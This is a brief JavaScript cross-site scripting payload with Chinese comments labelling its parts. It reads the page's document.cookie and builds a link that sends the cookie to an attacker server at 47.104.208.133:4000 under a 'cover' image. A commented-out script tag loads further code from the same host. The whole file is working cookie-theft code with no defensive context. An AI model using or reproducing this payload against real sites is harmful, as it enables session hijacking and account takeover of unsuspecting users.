var Str=document.cookie;               //获取cookie
var a =document.createElement('a');        //创建a标签
a.href='http://47.104.208.133:4000/getCookie?a='+Str;   //攻击者主机
a.innerHTML="<img src='http://47.104.208.133:4000/img'>";        //掩护图片
document.body.appendChild(a);   

{/* <script src="http://47.104.208.133:4000/js"></script> */}